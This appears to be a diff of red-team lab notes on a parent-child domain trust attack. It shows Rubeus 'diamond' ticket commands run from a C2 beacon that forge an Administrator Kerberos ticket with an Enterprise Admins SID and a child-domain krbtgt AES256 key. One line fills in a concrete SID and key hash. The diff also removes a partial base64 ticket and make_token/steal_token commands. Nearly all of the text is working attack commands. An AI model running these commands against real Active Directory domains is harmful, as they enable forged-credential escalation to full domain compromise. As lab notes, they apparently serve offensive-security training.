@@ -84,13 +84,8 @@ PARENT CHILD TRUST LAB (High Integrity beacon)
 /krbkey is the AES256 hash of the child domain's krbtgt account. 
 
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:domain_SID-512 /krbkey:CHILD_AESHASH_Krbtgt /nowrap
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
+- execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
 
-
-
-doIGQDCCBjygAwIBBaEDAgEWooIFLjCCBSphggUmMIIFIqADAgEFoRQbEkRVQkxJTi5DT05UT1NPLkNPTaInMCWgAwIBAqEeMBwbBmtyYnRndBsSRFVCTElOLkNPTlRPU08uQ09No4IE2jCCBNa
-make_token contoso\Administrator fakepass
-steal_token
 
 
 
